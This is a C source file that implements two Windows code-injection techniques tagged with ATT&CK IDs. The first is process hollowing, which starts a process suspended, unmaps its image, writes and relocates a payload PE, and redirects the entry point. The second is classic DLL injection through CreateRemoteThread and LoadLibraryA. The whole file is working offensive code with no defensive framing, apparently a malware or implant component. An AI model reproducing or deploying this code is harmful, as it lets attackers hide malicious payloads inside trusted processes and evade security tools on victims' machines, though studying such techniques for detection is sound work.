
#include <windows.h>
#include <stdio.h>
#include "ntdefs.h"

// NtUnmapViewOfSection typedef — resolved dynamically
typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);

// -- T1055.012: Process hollowing / ghost injection -------------------
BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process in suspended state
    if (!CreateProcessA(NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] ghost_inject: CreateProcess failed: %ld\n", GetLastError());
        return FALSE;
    }
    printf("[+] ghost_inject: Created suspended process PID %ld\n",
           pi.dwProcessId);

    // 2. Get thread context to find image base (PEB->ImageBaseAddress)
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] ghost_inject: GetThreadContext failed: %ld\n",
               GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    // Read the image base from PEB
    // On x64: PEB at ctx.Rdx, ImageBaseAddress at PEB+0x10
    PVOID pImageBase = NULL;
#ifdef _WIN64
    if (!ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                      &pImageBase, sizeof(PVOID), NULL)) {
        printf("[!] ghost_inject: Failed to read image base\n");
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
#else
    if (!ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                      &pImageBase, sizeof(PVOID), NULL)) {
        printf("[!] ghost_inject: Failed to read image base\n");
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
#endif
    printf("[*] ghost_inject: Target image base: %p\n", pImageBase);

    // 3. Unmap the original image
    fnNtUnmapViewOfSection pNtUnmap =
        (fnNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    if (pNtUnmap) {
        pNtUnmap(pi.hProcess, pImageBase);
        printf("[+] ghost_inject: Original image unmapped\n");
    }

    // 4. Parse payload PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS pNt =
        (PIMAGE_NT_HEADERS)(payload + pDos->e_lfanew);
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    PVOID preferredBase = (PVOID)(ULONG_PTR)pNt->OptionalHeader.ImageBase;

    // 5. Allocate memory at preferred base in target process
    PVOID pRemoteBase = VirtualAllocEx(pi.hProcess, preferredBase,
                                       imageSize, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    if (!pRemoteBase) {
        // Try any address if preferred is taken
        pRemoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    }
    if (!pRemoteBase) {
        printf("[!] ghost_inject: VirtualAllocEx failed: %ld\n",
               GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    printf("[+] ghost_inject: Allocated %ld bytes at %p\n",
           imageSize, pRemoteBase);

    // 6. Write PE headers
    WriteProcessMemory(pi.hProcess, pRemoteBase, payload,
                       pNt->OptionalHeader.SizeOfHeaders, NULL);

    // 7. Write sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                           (PBYTE)pRemoteBase + pSection[i].VirtualAddress,
                           payload + pSection[i].PointerToRawData,
                           pSection[i].SizeOfRawData, NULL);
    }
    // 7.5. Apply base relocations if we didn't get preferred base
    if (pRemoteBase != preferredBase) {
      DWORD relocRva =
          pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
              .VirtualAddress;
      DWORD relocSize =
          pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
              .Size;

      if (relocRva && relocSize) {
        DWORD_PTR delta = (DWORD_PTR)pRemoteBase - (DWORD_PTR)preferredBase;
        PIMAGE_BASE_RELOCATION pReloc =
            (PIMAGE_BASE_RELOCATION)(payload + relocRva);
        PBYTE relocEnd = (PBYTE)pReloc + relocSize;

        while ((PBYTE)pReloc < relocEnd && pReloc->SizeOfBlock) {
          if (pReloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
              printf("[!] ghost_inject: Invalid relocation block size\n");
              break;
          }
          DWORD entryCount =
              (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
              sizeof(WORD);
          PWORD entries =
              (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

          for (DWORD j = 0; j < entryCount; j++) {
            WORD type = entries[j] >> 12;
            WORD offset = entries[j] & 0x0FFF;
            DWORD_PTR fixAddr = pReloc->VirtualAddress + offset;

            if (type == IMAGE_REL_BASED_DIR64) {
              DWORD_PTR val = 0;
              ReadProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr, &val,
                                sizeof(val), NULL);
              val += delta;
              WriteProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
                                 &val, sizeof(val), NULL);
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
              DWORD val32 = 0;
              ReadProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
                                &val32, sizeof(val32), NULL);
              val32 += (DWORD)delta;
              WriteProcessMemory(pi.hProcess, (PBYTE)pRemoteBase + fixAddr,
                                 &val32, sizeof(val32), NULL);
            }
          }
          pReloc =
              (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
        }
        printf("[+] ghost_inject: Relocations applied\n");
      }
    }
    // 7.6. Set correct per-section memory permissions
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
      DWORD protect = PAGE_READONLY;
      DWORD chars = pSection[i].Characteristics;

      if (chars & IMAGE_SCN_MEM_EXECUTE) {
        protect = (chars & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
                                                : PAGE_EXECUTE_READ;
      } else if (chars & IMAGE_SCN_MEM_WRITE) {
        protect = PAGE_READWRITE;
      }

      DWORD oldProt = 0;
      VirtualProtectEx(pi.hProcess,
                       (PBYTE)pRemoteBase + pSection[i].VirtualAddress,
                       pSection[i].Misc.VirtualSize, protect, &oldProt);
    }
    // 8. Update PEB->ImageBaseAddress
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                       &pRemoteBase, sizeof(PVOID), NULL);
    // 9. Set entry point
    ctx.Rcx = (DWORD64)pRemoteBase +
              pNt->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                       &pRemoteBase, sizeof(PVOID), NULL);
    ctx.Eax = (DWORD)pRemoteBase +
              pNt->OptionalHeader.AddressOfEntryPoint;
#endif

    // 10. Set context and resume
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] ghost_inject: Payload injected and resumed in PID %ld\n",
           pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// -- T1055.001: Classic DLL injection (simpler fallback) --------------
BOOL dll_inject(DWORD targetPid, LPCSTR dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[!] dll_inject: OpenProcess failed: %ld\n", GetLastError());
        return FALSE;
    }

    SIZE_T pathLen = strlen(dllPath) + 1;
    PVOID pRemote = VirtualAllocEx(hProcess, NULL, pathLen,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!pRemote) {
        printf("[!] dll_inject: VirtualAllocEx failed\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pRemote, dllPath, pathLen, NULL);

    FARPROC pLoadLib = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLib,
        pRemote, 0, NULL);

    if (!hThread) {
        printf("[!] dll_inject: CreateRemoteThread failed: %ld\n",
               GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] dll_inject: DLL injected into PID %ld\n", targetPid);
    return TRUE;
}
